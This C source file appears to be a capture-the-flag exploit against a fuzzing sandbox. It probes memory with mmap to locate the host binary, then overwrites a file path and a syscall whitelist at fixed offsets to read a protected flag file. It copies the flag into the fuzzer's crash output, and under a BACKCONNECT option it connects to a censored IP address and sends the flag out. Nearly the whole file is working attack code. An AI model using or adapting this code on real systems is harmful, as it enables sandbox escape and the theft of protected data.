#ifdef DEBUG
#include <assert.h>
#endif
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

#ifdef BACKCONNECT
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#endif

static void *descend(void *start, void *end, size_t step) {
  for (void *i = start; i < end; i += step) {
    void *p = mmap(i, step, PROT_READ | PROT_WRITE | PROT_EXEC,
                   MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    if (p != MAP_FAILED)
      munmap(p, step);
    if (p == i)
      continue;
    if (step == 0x1000)
      return i;
    p = descend(i, i + step, step / 0x10);
    if (p != MAP_FAILED)
      return p;
  }
  return MAP_FAILED;
}

static int sc_whitelist[] = {60,  231, 0,   19, 1,   20, 205, 218, 12,
                             63,  21,  257, 10, 11,  12, 63,  269, 257,
                             262, 9,   10,  12, 158, 63, 21,  257, 5,
                             3,   4,   17,  9,  10,  12, 158, 63};

static void steal_flag(void) {
  const char *flag_path = "/rfl-fuzz/flag";
  FILE *flag = fopen(flag_path, "r");
#ifdef DEBUG
  assert(flag == NULL);
#endif
  void *p =
      descend((void *)0x555555554000, (void *)0x565555554000, 0x100000000);
  printf("%p\n", p);
#if defined(__x86_64__)
  void *path = (char *)p + 0x186D06;
  void *page = (char *)p + 0x186000;
  char *syscall = (char *)p + 0x18AA20;
  char *syscall_page = (char *)p + 0x18A000;
#else
  void *path = (char *)p + 0x26156E;
  void *page = (char *)p + 0x261000;
#endif
  printf("path = %p\n", path);
#ifdef DEBUG
  assert(strcmp(path, "/etc/ld.so.cache") == 0);
#endif
  void *pp = mmap(page, 0x1000, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
#ifdef DEBUG
  assert(page == pp);
  assert(strcmp(path, "") == 0);
#endif
  strcpy(path, flag_path);
#ifdef DEBUG
  assert(*syscall == 0x3c);
#endif
  pp = mmap(syscall_page, 0x1000, PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
#ifdef DEBUG
  assert(pp == syscall_page);
  assert(*syscall == 0);
#endif
  memcpy(syscall, sc_whitelist, sizeof(sc_whitelist));
  syscall[0] = 83; /* mkdir */
  flag = fopen(flag_path, "r");
#ifdef DEBUG
  assert(flag != NULL);
#endif
  char out_path[256];
  mkdir(getenv("FUZZ_DIR"), 0777);
  sprintf(out_path, "%s/out", getenv("FUZZ_DIR"));
  mkdir(out_path, 0777);
  sprintf(out_path, "%s/out/main", getenv("FUZZ_DIR"));
  mkdir(out_path, 0777);
  sprintf(out_path, "%s/out/main/crashes", getenv("FUZZ_DIR"));
  mkdir(out_path, 0777);
  sprintf(out_path, "%s/out/main/crashes/flag", getenv("FUZZ_DIR"));
  strcpy(path, out_path);
  FILE *out = fopen(out_path, "w");
#ifdef DEBUG
  assert(out != NULL);
#endif
  char buf[256];
  size_t size = fread(buf, 1, sizeof(buf), flag);
  fwrite(buf, 1, size, out);
  fclose(out);

#ifdef BACKCONNECT
  syscall[0] = 41; /* socket */
  int s = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(1234);
  addr.sin_addr.s_addr = inet_addr("<censored>");
  syscall[0] = 42; /* connect */
  connect(s, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
  write(s, buf, size);
#endif

  __builtin_trap();
}

int target_func(char *buf, int size) {
  if (buf[0] == 'B')
    steal_flag();
  return 0;
}

static char data[1024] = {0};

int main() {
  printf("your input:\n");
  fgets(data, sizeof(data), stdin);
  target_func(data, sizeof(data));
  return 0;
}
